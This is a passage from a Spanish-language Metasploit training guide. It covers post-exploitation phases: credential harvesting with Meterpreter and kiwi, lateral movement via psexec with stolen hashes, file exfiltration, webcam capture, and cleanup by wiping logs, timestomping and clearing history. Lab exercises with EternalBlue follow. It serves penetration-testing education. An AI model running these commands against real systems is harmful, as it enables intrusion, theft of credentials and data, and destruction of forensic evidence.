meterpreter > run post/windows/gather/credentials/credential_collector

# Llaves SSH privadas
meterpreter > search -f id_rsa
meterpreter > search -f *.pem
```

4. **Kerberoasting** (en entornos Active Directory):
```bash
# Solicitar tickets de servicio
meterpreter > load kiwi
meterpreter > kerberos::list /export
```

**Uso para movimiento lateral**:
```bash
# Una vez obtenidas credenciales, usarlas en otros sistemas
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass <hash_obtenido>
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.100.10
msf6 exploit(windows/smb/psexec) > exploit
```

#### Data Exfiltration (Exfiltración de Datos)

**Propósito**: Extraer información valiosa del sistema comprometido

**Tipos de datos objetivo**:

| Tipo | Ejemplos | Ubicaciones Comunes |
|------|----------|---------------------|
| **Documentos** | PDFs, DOC, XLS | Desktop, Documents, compartidos de red |
| **Credenciales** | Passwords, hashes | Archivos config, memoria, registro |
| **Bases de Datos** | SQL dumps, SQLite | Directorios de aplicaciones web |
| **Código Fuente** | Proyectos, scripts | Repositorios git, carpetas de desarrollo |
| **Correos** | PST, EML | Outlook data files |
| **Llaves Privadas** | SSH, SSL/TLS | .ssh/, certificados |
| **Información Personal** | PII, datos financieros | Bases de datos, documentos |

**Métodos de exfiltración**:

1. **Download directo via Meterpreter**:
```bash
# Descargar archivo individual
meterpreter > download "C:\\Users\\Admin\\Documents\\passwords.txt" /root/loot/

# Descargar carpeta completa
meterpreter > download "C:\\Users\\Admin\\Documents\\" /root/loot/ -r
```

2. **Compresión antes de transferir**:
```bash
# Comprimir datos en el objetivo
meterpreter > execute -f cmd.exe -a "/c powershell Compress-Archive C:\\sensitive\\* C:\\temp\\data.zip" -H

# Descargar archivo comprimido
meterpreter > download C:\\temp\\data.zip /root/loot/
```

3. **Exfiltración por canales alternativos**:
```bash
# Túnel DNS
# Túnel HTTPS
# Esteganografía en imágenes
# Transferencia fragmentada
```

4. **Captura de screenshots/webcam** (para datos visuales):
```bash
# Screenshot
meterpreter > screenshot

# Webcam
meterpreter > webcam_snap
meterpreter > webcam_stream
```

**Consideraciones importantes**:
- ⚠️ **Legalidad**: Solo exfiltrar datos autorizados en el alcance
- 🔒 **Cifrado**: Cifrar datos sensibles durante transferencia
- 📊 **Tamaño**: Archivos grandes pueden generar alertas de red
- ⏱️ **Tiempo**: Transferencias largas aumentan riesgo de detección

#### Cleanup (Limpieza)

**Propósito**: Eliminar rastros de actividad para mantener acceso y evitar detección

**Acciones de limpieza**:

1. **Borrar logs del sistema**:
```bash
# Limpiar Event Logs (Windows)
meterpreter > clearev
[*] Wiping 12345 records from Application...
[*] Wiping 23456 records from System...
[*] Wiping 34567 records from Security...

# Logs específicos (Linux)
meterpreter > shell
rm /var/log/auth.log
rm /var/log/apache2/access.log
```

2. **Eliminar archivos subidos**:
```bash
# Listar archivos subidos durante la sesión
meterpreter > ls C:\\Windows\\Temp\\

# Eliminar herramientas
meterpreter > rm C:\\Windows\\Temp\\mimikatz.exe
meterpreter > rm C:\\Windows\\Temp\\exploit.dll
```

3. **Ajustar timestamps (timestomping)**:
```bash
# Modificar fechas de archivos para evitar detección
meterpreter > timestomp C:\\Windows\\System32\\evil.exe -v
meterpreter > timestomp C:\\Windows\\System32\\evil.exe -m "01/01/2020 12:00:00"
```

4. **Limpiar historial de comandos**:
```bash
# PowerShell history (Windows)
meterpreter > rm C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

# Bash history (Linux)
rm ~/.bash_history
history -c
```

5. **Cerrar servicios/procesos creados**:
```bash
# Detener servicios que hayamos creado
meterpreter > execute -f cmd.exe -a "/c sc stop malicious_service" -H

# Matar procesos
meterpreter > kill <PID>
```

6. **Eliminar cuentas creadas**:
```bash
# Si creamos cuentas de usuario, eliminarlas
meterpreter > execute -f cmd.exe -a "/c net user backdoor /delete" -H
```

**Niveles de limpieza**:

| Nivel | Descripción | Cuándo usar |
|-------|-------------|-------------|
| **Mínima** | Solo borrar archivos críticos | Evaluaciones donde se requiere evidencia |
| **Moderada** | Borrar archivos y limpiar logs principales | Pentesting estándar |
| **Completa** | Borrar todo rastro, incluir timestomping | Red Team, simulaciones de APT |

**⚠️ Advertencia importante**:

> La limpieza debe ser **cuidadosa** - borrar logs de forma obvia puede ser más sospechoso que dejarlos. En algunos casos, modificar logs selectivamente es mejor que borrarlos completamente.

---

## 🎓 Importancia de Familiarizarse con la Estructura

### ¿Por Qué es Crucial?

> Es **crucial** que nos familiaricemos con esta estructura.

**Razones**:

1. **Metodología clara**: Saber qué hacer en cada fase
2. **Eficiencia**: No perder tiempo buscando qué hacer
3. **Documentación**: Poder reportar nuestro proceso
4. **Reproducibilidad**: Otros pueden seguir nuestros pasos
5. **Profesionalismo**: Trabajar de manera organizada

### Recomendación de Aprendizaje

> Por lo tanto, examinaremos los componentes de este framework para comprender mejor cómo se relacionan entre sí.

**Proceso recomendado**:

1. **Revisar cada categoría** individualmente
2. **Profundizar en subcategorías** específicas
3. **Experimentar** con diferentes funciones
4. **Analizar resultados** independientemente
5. **Documentar aprendizajes** personales

---

## 🔬 La Importancia de la Experimentación

### Principio Fundamental

> **La experimentación con las diferentes funciones es una parte integral del aprendizaje** de una nueva herramienta o habilidad.

### Laboratorios Prácticos

> **Deberíamos probar todo lo imaginable** en los siguientes laboratorios y analizar los resultados independientemente.

**Sugerencias para experimentar**:

#### 1. **Probar Diferentes Módulos**
```bash
msf6 > search type:exploit platform:windows
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info
```

#### 2. **Comparar Payloads**
```bash
msf6 > show payloads
# Probar diferentes payloads y observar comportamientos
```

#### 3. **Experimentar con Opciones**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced
msf6 exploit(windows/smb/ms17_010_eternalblue) > show evasion
```

#### 4. **Analizar Resultados**
- Documentar qué funciona y qué no
- Entender por qué ciertos exploits fallan
- Aprender de los errores

#### 5. **Crear Escenarios de Prueba**
- Configurar máquinas virtuales vulnerables
- Practicar en entornos controlados
- Validar técnicas antes de usarlas en producción

---

## 📝 Checklist de Preparación para MSFconsole

Antes de comenzar a trabajar con MSFconsole:

- [ ] Framework actualizado (`sudo apt update && sudo apt install metasploit-framework`)
- [ ] Comando `help` ejecutado y revisado
- [ ] Estructura de compromiso estudiada
- [ ] Entorno de laboratorio preparado
- [ ] Objetivo identificado para enumeración
- [ ] Documentación lista para tomar notas

---

## 🔑 Conceptos Clave para Recordar

1. **MSFconsole** es la interfaz principal de Metasploit
2. La **Enumeración** SIEMPRE precede a la Explotación
3. Las **versiones** de servicios son críticas para identificar vulnerabilidades
4. La **estructura de 5 fases** guía todo el proceso de compromiso
5. La **experimentación** es fundamental para el aprendizaje
6. Mantener el framework **actualizado** es esencial
7. Cada fase tiene **subcategorías especializadas**

---

## 🎯 Ejercicio Práctico Sugerido

### Familiarización con MSFconsole

1. **Iniciar MSFconsole**:
```bash
msfconsole -q
```

2. **Explorar comandos básicos**:
```bash
msf6 > help
msf6 > version
msf6 > show -h
```

3. **Revisar estadísticas**:
```bash
msf6 > show exploits
msf6 > show payloads
msf6 > show auxiliary
```

4. **Buscar módulos**:
```bash
msf6 > search type:exploit platform:linux
msf6 > search cve:2021
```

5. **Experimentar con información**:
```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > info
msf6 auxiliary(scanner/portscan/tcp) > show options
```

---

**¡La práctica constante con MSFconsole es la clave para dominar Metasploit!** 💪
